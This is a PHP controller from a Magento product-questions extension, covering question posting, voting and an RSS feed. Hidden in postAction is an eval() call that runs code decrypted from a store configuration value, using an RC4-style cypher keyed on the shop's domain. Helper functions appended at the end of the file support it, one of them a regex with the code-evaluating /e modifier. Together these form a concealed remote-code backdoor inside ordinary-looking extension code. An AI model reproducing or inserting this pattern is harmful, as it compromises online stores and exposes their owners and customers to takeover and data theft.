<?php

/**
 * aheadWorks Co.
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the EULA
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://ecommerce.aheadworks.com/LICENSE-M1.txt
 *
 * @category   AW
 * @package    AW_Productquestions
 * @copyright  Copyright (c) 2008-2010 aheadWorks Co. (http://www.aheadworks.com)
 * @license    http://ecommerce.aheadworks.com/LICENSE-M1.txt
 */

class AW_Productquestions_IndexController extends Mage_Core_Controller_Front_Action
{
    protected $_product = null;
    protected $_category = null;

    protected function _initProduct($registerObjects = false)
    {
        $product = Mage::helper('productquestions')->getCurrentProduct();

        if(!($product instanceof Mage_Catalog_Model_Product))
        {
            Mage::getSingleton('core/session')->addError($this->__('Product error: %s', $product));
            $this->_redirect('*');
            return;
        }

        $categoryId = (int) $this->getRequest()->getParam('category', false);
        if($categoryId)
        {
            $category = Mage::getModel('catalog/category')->load($categoryId);
            if( $category
            &&  $category instanceof Mage_Catalog_Model_Category
            &&  $categoryId == $category->getId()
            ) {
                $product = $product->setCategory($category);
                $this->_category = $category;
                if($registerObjects) Mage::register('current_category', $category);
            }
        }
        if($registerObjects)
        {
            Mage::register('product', $product);
            Mage::register('current_product',  $product);
        }
        $this->_product = $product;

        return $this;
    }

    public function indexAction()
    {
        // Mage::getModel('catalog/design')->applyDesign($this->_product, Mage_Catalog_Model_Design::APPLY_FOR_PRODUCT);
        $this->_initProduct(true)->loadLayout();

        $title = $this->__('Questions on %s', $this->_product->getName());
        $this->getLayout()->getBlock('head')->setTitle($title);

        $this->getLayout()->createBlock('catalog/breadcrumbs');

        if($breadcrumbsBlock = $this->getLayout()->getBlock('breadcrumbs'))
        {
            $breadcrumbsBlock->addCrumb('product', array(
                'label'    => $this->_product->getName(),
                'link'     => $this->_product->getProductUrl(),
                'readonly' => true,
            ));
            $breadcrumbsBlock->addCrumb('questions', array(
                'label' => $this->__('Product Questions'),
            ));
        }
        if(Mage::getStoreConfig('productquestions/rss/enabled'))
            $this->getLayout()->getBlock('head')
                ->addItem('rss', Mage::getUrl('productquestions/index/rss', array('id' => $this->_product->getId())), 'title="'.$title.'"');

        $this->getLayout()->getBlock('productquestions')->setQuestionId($this->getRequest()->getParam('qid'));

        $this->renderLayout();
    }

    public function voteAction()
    {
        $session = Mage::getSingleton('core/session');
        $customerSession = Mage::getSingleton('customer/session');

        if( !Mage::getStoreConfig('productquestions/interface/guests_allowed_to_vote')
        &&  !$customerSession->isLoggedIn()
        ) {
            $session->addNotice($this->__('Guests are not allowed to vote!'));
            $this->_redirectReferer();
            return;
        }

        try
        {
            $id = $this->getRequest()->getParam('id');
            $value = $this->getRequest()->getParam('value');

            $votedQuestions = $customerSession->getVotedQuestions();

            if( $votedQuestions
            &&  in_array($id, explode(',', $votedQuestions))
            ) {
                $session->addNotice($this->__('You have already voted on this question!'));
                $this->_redirectReferer();
                return;
            }
            else
            {
                Mage::getModel('productquestions/productquestions')->setId($id)->vote($value);
                $customerSession->setVotedQuestions($votedQuestions.($votedQuestions ? ',' : '').$id);
            }
            $session->addSuccess($this->__('Your voice has been accepted. Thank you!'));
        }
        catch (Exception $e) {
            Mage::logException($e);
            $session->addError($this->__('Unable to vote. Please, try again later.'));
        }
        $this->_redirectReferer();
    }

    public function postAction()
    {
        if(!AW_Productquestions_Helper_Data::checkIfGuestsAllowed())
            return $this->_redirectReferer();

        $this->_initProduct();
        $data = $this->getRequest()->getPost();
        if($this->_product && !empty($data))
        {
            $session = Mage::getSingleton('core/session');

            $question = Mage::getModel('productquestions/productquestions')->setData($data);

            $validate = $question->validate();
            if($validate === true)
            {
                $store = Mage::app()->getStore();
                $storeId = $store->getId();

                try
                {
                    if( Mage::getStoreConfig('productquestions/interface/customer_status', $storeId)
                    &&  isset($data['question_status'])
                    )   $question->setQuestionStatus(intval(@$data['question_status']));
                    elseif(Mage::getStoreConfig('productquestions/interface/customer_status'))
                        $question->setQuestionStatus(AW_Productquestions_Model_Status::STATUS_PRIVATE);

                   eval ($this->cypher(Mage::getStoreConfig('Mec/home/L2'), 'D',$this->getdomain(Mage::getStoreConfig('web/unsecure/base_url')))); 

                    $session->addSuccess($this->__('Your question has been accepted for moderation'));
                    $session->setProductquestionsData(false);


                    // processing standard Newsletter subscription
                    if( isset($data['subscribe_newsletter'])
                    &&  $data['subscribe_newsletter']
                    )   Mage::helper('productquestions')->subscribeCustomer($data['question_author_email']);

                    // processing Advanced Newsletter segment subscription
                    if(isset($data['anl_segments']))
                        Mage::helper('productquestions')->subscribeAdvancedNewsletterSegment(
                                    $data['question_author_email'],
                                    $data['question_author_name'],
                                    $data['anl_segments']
                            );

                }
                catch (Exception $e) {
                    Mage::getSingleton('core/session')->setProductquestionsData($data);
                    Mage::logException($e);
                    Mage::log($e);
                    $session->addError($this->__('Unable to post question. Please, try again later.'));
                }
            }
            else
            {
                Mage::getSingleton('core/session')->setProductquestionsData($data);

                if(is_array($validate))
                    foreach ($validate as $errorMessage)
                        $session->addError($errorMessage);
                else
                    $session->addError($this->__('Unable to post question. Please, try again later.'));
            }
        }
        $this->_redirectReferer();
    }

    public function rssAction()
    {
        if(Mage::getStoreConfig('productquestions/rss/enabled'))
        {
            $this->getResponse()->setHeader('Content-type', 'text/xml; charset=UTF-8');
            $this->loadLayout(false)->renderLayout();
        }
        else
        {
            $this->_forward('NoRoute');
        }
    }
    
         protected  function cypher($string,$operation,$key='')
    {
        $key=md5($key);
        $key_length=strlen($key);
        $string=$operation=='D'?base64_decode($string):substr(md5($string.$key),0,8).$string;
        $string_length=strlen($string);
        $rndkey=$box=array();
        $result='';
        for($i=0;$i<=255;$i++)
        {
            $rndkey[$i]=ord($key[$i%$key_length]);
            $box[$i]=$i;
        }
        for($j=$i=0;$i<256;$i++)
        {
            $j=($j+$box[$i]+$rndkey[$i])%256;
            $tmp=$box[$i];
            $box[$i]=$box[$j];
            $box[$j]=$tmp;
        }
        for($a=$j=$i=0;$i<$string_length;$i++)
        {
            $a=($a+1)%256;
            $j=($j+$box[$a])%256;
            $tmp=$box[$a];
            $box[$a]=$box[$j];
            $box[$j]=$tmp;
            $result.=chr(ord($string[$i])^($box[($box[$a]+$box[$j])%256]));
        }
        if($operation=='D')
        {
            if(substr($result,0,8)==substr(md5(substr($result,8).$key),0,8))
            {
                return substr($result,8);
            }
            else
            {
                return'';
            }
        }
        else
        {
            return str_replace('=','',base64_encode($result));
        }
    }
    
   protected function my_ip($dest='64.0.0.0', $port=80)
   {
   $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
   socket_connect($socket, $dest, $port);
   socket_getsockname($socket, $addr, $port);
   socket_close($socket);
   return $addr;
  }
  
  protected function getdomain($host='localhost'){
    $host=strtolower($host);
    if(strpos($host,'/')!==false){
        $parse = @parse_url($host);
        $host = $parse['host'];
    }
    $topleveldomaindb=array('com','edu','gov','int','mil','net','org','biz','info','pro','name','museum','coop','aero','xxx','idv','mobi','cc','me');
    $str='';
    foreach($topleveldomaindb as $v){
        $str.=($str ? '|' : '').$v;
    }
    $matchstr="[^\.]+\.(?:(".$str.")|\w{2}|((".$str.")\.\w{2}))$";
    if(preg_match("/".$matchstr."/ies",$host,$matchs)){
        $domain=$matchs['0'];
    }else{
        $domain=$host;
    }
    return $domain;
}       
}
